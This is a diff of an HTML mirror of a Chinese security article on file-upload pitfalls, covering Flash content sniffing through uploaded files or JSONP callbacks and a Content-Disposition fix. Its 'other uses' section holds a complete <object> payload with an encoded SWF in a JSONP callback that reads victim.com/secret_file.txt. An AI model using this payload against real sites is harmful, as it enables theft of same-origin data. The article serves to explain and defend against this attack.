@@ -3,14 +3,14 @@
 			<head>
 			     <title>上传文件的陷阱 - /fd</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/2031">http://drops.wooyun.org/tips/2031</a></h1>
 				
       <p>
-        <h2>0x00 背景</h2>
+        </p><h2>0x00 背景</h2>
 
-<hr />
+<hr>
 
 <p>现在很多网站都允许用户上传文件，但他们都没意识到让用户（或攻击者）上传文件（甚至合法文件）的陷阱。</p>
 
@@ -30,7 +30,7 @@
 
 <h2>0x01 攻击</h2>
 
-<hr />
+<hr>
 
 <p>基于上面我们可以想像一种攻击场境：</p>
 
@@ -50,7 +50,7 @@
 
 <h2>0x02 修补</h2>
 
-<hr />
+<hr>
 
 <p>好消息是有一个相对简单的方法防止该Flash的行为。 Flash若看到文件返回下面的Content-Disposition header就不会执行：</p>
 
@@ -61,7 +61,7 @@
 
 <h2>0x03 其他用途</h2>
 
-<hr />
+<hr>
 
 <p>实际上，该攻击不只限制于文件上传。该攻击只要求攻击者能够控制域名下的数据（不论Content-Type），因此还有其他实施攻击的方法。</p>
 
@@ -70,7 +70,7 @@
 <pre><code>&lt;object style="height:1px;width:1px;" data="http://victim.com/user/jsonp?callback=CWS%07%0E000x%9C%3D%8D1N%C3%40%10E%DF%AE%8D%BDI%08%29%D3%40%1D%A0%A2%05%09%11%89HiP%22%05D%8BF%8E%0BG%26%1B%D9%8E%117%A0%A2%DC%82%8A%1Br%04X%3B%21S%8C%FE%CC%9B%F9%FF%AA%CB7Jq%AF%7F%ED%F2%2E%F8%01%3E%9E%18p%C9c%9Al%8B%ACzG%F2%DC%BEM%EC%ABdkj%1E%AC%2C%9F%A5%28%B1%EB%89T%C2Jj%29%93%22%DBT7%24%9C%8FH%CBD6%29%A3%0Bx%29%AC%AD%D8%92%FB%1F%5C%07C%AC%7C%80Q%A7Nc%F4b%E8%FA%98%20b%5F%26%1C%9F5%20h%F1%D1g%0F%14%C1%0A%5Ds%8D%8B0Q%A8L%3C%9B6%D4L%BD%5F%A8w%7E%9D%5B%17%F3%2F%5B%DCm%7B%EF%CB%EF%E6%8D%3An%2D%FB%B3%C3%DD%2E%E3d1d%EC%C7%3F6%CD0%09" type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="c=alert&amp;u=http://victim.com/secret_file.txt"&gt;&lt;/object&gt;
 </code></pre>
 
-<p>from: http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website</p>      </p>
+<p>from: http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website</p>      <p></p>
     
 			</body>
 		</html>
